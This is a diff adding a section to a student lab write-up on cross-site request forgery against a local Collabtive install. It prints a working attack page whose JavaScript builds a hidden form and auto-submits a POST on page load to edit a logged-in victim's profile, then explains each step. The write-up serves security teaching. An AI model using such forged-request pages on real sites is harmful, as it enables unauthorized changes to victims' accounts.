@@ -186,8 +186,78 @@ text/html; charset=utf-8
 #+end_src
 
 With the captured request, we now have the information (namely the
-requests' structure and its reference to the session cookie) required
-for us to forge a new one.
+requests' structure) required for us to forge a new one. Next we need
+to make an HTML page for our attack, with a hidden form filled with
+our desired changes, and some embedded Javascript to submit it through
+a POST request.
+
+#+begin_src html
+  <!DOCTYPE html>
+  <!--
+  This code was provided by the lab's author Wenliang Du, of Syracuse
+  University under the GNU Free Documentation License
+  
+  Editted by us to make our desired changes, and post to the correct
+  URL.
+  -->
+  <html>
+  <title>
+  </title>
+  <body>
+  <h1>
+  This page forges an HTTP POST request.
+  </h1>
+  <script type="text/javascript">
+  function post(url,fields) {
+     //create a <form> element.
+     var p = document.createElement('form');
+     //construct the form
+     p.action = url;
+     p.innerHTML = fields;
+     p.target = 'self';
+     p.method = 'post';
+     //append the form to the current page.
+     document.body.appendChild(p);
+     //submit the form
+     p.submit();
+  }
+  
+  function csrf_hack() {
+  var fields;
+     // The following are form entries that need to be filled out
+     //     by attackers. The entries are made hidden, so the victim
+     //     won't be able to see them.
+     fields += "<input type='hidden' name='name' value='notbob' />";
+     fields += "<input type='hidden' name='gender' value='female' />";
+     fields += "<input type='hidden' name='company' value='seed' />";
+     post('http://localhost/CSRF/Collabtive/manageuser.php?action=edit',fields);
+  }
+  // invoke csrf_hack() after the page is loaded.
+  window.onload = function() { csrf_hack(); }
+  </script>
+  </body>
+  </html>
+#+end_src
+
+Now if we login to a user (we chose 'bob'), and then in a separate
+browser tab open the attack code at
+http://localhost/CSRF/Attack/index.html, our cross-site request
+forgery will change bob's name to 'notbob', transgender him, and
+assign him to our company 'seed'. This is done when the csrf_hack()
+JavaScript function is called (on page load through the
+'window.onload' hook), which adds our three HTML form inputs to a
+fields variable, and submits this and the attack URL
+('http://localhost/CSRF/Collabtive/manageuser.php?action=edit') to the
+function post(), which creates an HTML form element on the document
+and puts it into a temporary variable, assigns the url to the action
+of the element, puts the value of fields into the element's inner
+HTML, assigns the element as target, makes the element's method a POST
+request, appends the element as a child to the body of the HTML
+document, and calls submit on the element. This final action causes
+the actual POST request with the hidden HTML form to be submitted to
+the target URL, which in turn edit's the users profile because the
+destination server cannot distinguish the forged request because it
+trusts (through the browser's cookie) the user's authentication.
 
 * Code
 
